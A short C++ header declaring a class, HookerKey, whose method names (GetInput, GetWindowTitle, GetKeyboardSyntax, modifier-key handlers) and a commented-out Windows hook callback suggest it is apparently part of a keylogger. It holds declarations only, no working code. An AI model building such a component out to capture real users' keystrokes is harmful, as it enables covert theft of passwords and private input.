/* 
   
 */

#ifndef _HookerKey_hh_
#define _HookerKey_hh_

#include	"AHooker.hh"

class HookerKey: AHooker
{
  public:
    HookerKey();
    ~HookerKey();
    std::string	GetInput();
    Input		OrderInput(int ToOrder);
	std::string	GetSyntax(int a);
	std::string	GetWindowTitle();
	std::string	GetKeyboardSyntax();
	//LRESULT CALLBACK MyProc(int nCode, WPARAM wParam, LPARAM lParam);
	int			ChangeNumberMaj(int a);
	int			ChangeNumberAlt(int a);
};

#endif /* _HookerKey_hh_ */